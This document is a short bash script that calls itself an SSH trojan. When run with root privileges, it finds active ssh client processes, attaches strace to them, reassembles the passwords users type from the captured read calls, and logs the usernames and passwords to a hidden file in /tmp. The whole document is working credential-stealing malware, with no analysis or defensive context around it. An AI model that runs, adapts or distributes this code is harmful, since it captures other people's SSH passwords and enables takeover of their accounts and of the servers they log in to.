#!/bin/bash

file_log="/tmp/.log_sshtrojan2.txt"
file_log_second="/tmp/log.txt"

#Check root permissions
if [[ $EUID -ne 0 ]]; then
  echo "You need root privileges to run this program"
  exit 1
fi

#Check log file exists or not
if [[ -e $file_log  ]]; then
  echo "File $file_log was created"
else
  touch $file_log
fi

echo "Running trojan...."

while true :
do
    #parse pid from ssh process
    pid=$(ps aux | grep -w ssh | grep @ | head -n1 | awk '{print $2}')

    if [[ $pid != "" ]]; then
        echo "$pid"
        #get username from ssh process
        username=$(ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d '@' -f1)
        echo 'Run Strace'
        password=""
        strace -e trace=read,write -p "$pid" -f -o $file_log_second
        cat $file_log_second | while read line; do
            #parse password
            if [[ $line =~ "read(4, ".*", 1)" ]]; then
                c=$(echo "$line" | awk '{print $3}' | cut -d'"' -f2)
                if [[ $c == "n" ]];then
                    echo "Username: " "$username" >> $file_log
                    echo "Password: " "$password" >> $file_log
                    password=""
                else
                    password+=$c
                fi
            fi
        done
    fi
done

